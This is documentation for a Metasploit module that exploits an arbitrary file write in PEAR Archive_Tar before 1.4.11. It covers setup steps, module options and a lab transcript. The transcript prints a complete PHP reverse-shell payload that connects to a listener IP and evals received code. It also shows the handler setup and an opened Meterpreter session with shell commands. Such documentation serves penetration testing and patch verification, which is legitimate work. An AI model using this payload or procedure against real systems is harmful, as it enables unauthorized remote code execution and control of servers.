## Vulnerable Application

[Archive_Tar](https://github.com/pear/Archive_Tar/) is a plugin for the
[PEAR PHP development framework](https://pear.php.net/) that allows developers
the ability to create, delete, modify and extract files from TAR archives.

This module takes advantages of Archive_Tar < 1.4.11's lack of validation of file
stream wrappers contained within filenames to write an arbitrary file containing
user controlled content to an arbitrary file on disk. Note that the file will be
written to disk with the permissions of the user that PHP is running as, so it may
not be possible to overwrite some files if the PHP user is not appropriately
privileged.


## Verification Steps

1. **Install** the PEAR framework using the instructions at https://pear.php.net/manual/en/installation.getting.php
1. **Verify** the PEAR framework is working using the instructions at https://pear.php.net/manual/en/installation.checking.php
1. **Download** the PoC files from the original advisory at https://github.com/pear/Archive_Tar/files/5551831/exploit.zip.
1. **Unzip** the files to a sample directory
1. Open up `msfconsole`.
1. `use exploit/multi/fileformat/archive_tar_arb_file_write`
1. `set FILENAME exploit.tar`
1. `set FILEPATH *path to the file to overwrite on the target system*`
1. `run`
1. **Copy** the generated `exploit.tar` file to the `file_proc` directory within the directory you expanded `exploit.zip` to from earlier.
1. **Run** `php vulnerable.php`
1. **Verify** that the file was created in the location you specified in the `FILEPATH` parameter,
with the contents of the PHP shell that you specified for the `PAYLOAD` parameter.


## Options

### FILENAME
The name of the TAR file to be created locally

### FILEPATH
The full path to the file on the target system that should be
created or overwritten with the code for a PHP shell.


## Scenarios

### Archive_Tar v1.4.10

First create the malicious TAR file and set up the listener:

```
msf6 > use exploit/multi/fileformat/archive_tar_arb_file_write
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/fileformat/archive_tar_arb_file_write) > show options

Module options (exploit/multi/fileformat/archive_tar_arb_file_write):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME                   no        The file name.
   FILEPATH  /tmp/msf.php     yes       The full path to the file to write on the target.


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.30.86.152    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   Archive_Tar < 1.4.11


msf6 exploit(multi/fileformat/archive_tar_arb_file_write) > set FILENAME test.tar
FILENAME => test.tar
msf6 exploit(multi/fileformat/archive_tar_arb_file_write) > set FILEPATH /tmp/test.php
FILEPATH => /tmp/test.php
msf6 exploit(multi/fileformat/archive_tar_arb_file_write) > run

[*] Writing file: test.tar (3072 bytes) ...
[+] test.tar stored at /home/test/.msf4/local/test.tar
msf6 exploit(multi/fileformat/archive_tar_arb_file_write) > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 172.30.86.152
LHOST => 172.30.86.152
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 172.30.86.152:4444
```

Then copy the file over and into the expanded copy of https://github.com/pear/Archive_Tar/files/5551831/exploit.zip
and run vulnerable.php to simulate an application opening a tar file and extracting its contents.

```
 ~/drupal/exploit/file_poc #  ls
create_tar.py  exploit.tar  input_file.txt  php_errors.log  steps.sh  vulnerable.php
 ~/drupal/exploit/file_poc #  rm -rf exploit.tar
 ~/drupal/exploit/file_poc #  cp /home/test/.msf4/local/test.tar exploit.tar
 ~/drupal/exploit/file_poc # ls -alh /tmp/test.php
ls: cannot access '/tmp/test.php': No such file or directory
 ~/drupal/exploit/file_poc # php vulnerable.php
 ~/drupal/exploit/file_poc # cat vulnerable.php
<?php

  require_once('../Archive/Tar.php');

  $archive = new Archive_Tar('exploit.tar');
  $archive->extract();
 ~/drupal/exploit/file_poc  ls -alh /tmp/test.php
-rw-rw-r-- 1 test test 1.1K Jan 15 17:54 /tmp/test.php
 ~/drupal/exploit/file_poc # cat /tmp/test.php
/*<?php /**/ error_reporting(0); $ip = '172.30.86.152'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

Now we just have to run the PHP file to simulate a user browsing to the web page:

```
php /tmp/test.php
```

And the shell will be obtained:

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 172.30.86.152:4444
[*] Sending stage (39282 bytes) to 172.30.86.152
[*] Meterpreter session 2 opened (172.30.86.152:4444 -> 172.30.86.152:56754) at 2021-01-15 18:02:55 -0600

meterpreter > getuid
Server username: test (1000)
meterpreter > uname -a
[-] Unknown command: uname.
meterpreter > shell
Process 29349 created.
Channel 0 created.
uname -a
Linux test-Virtual-Machine 5.8.0-36-generic #40~20.04.1-Ubuntu SMP Wed Jan 6 10:15:55 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```
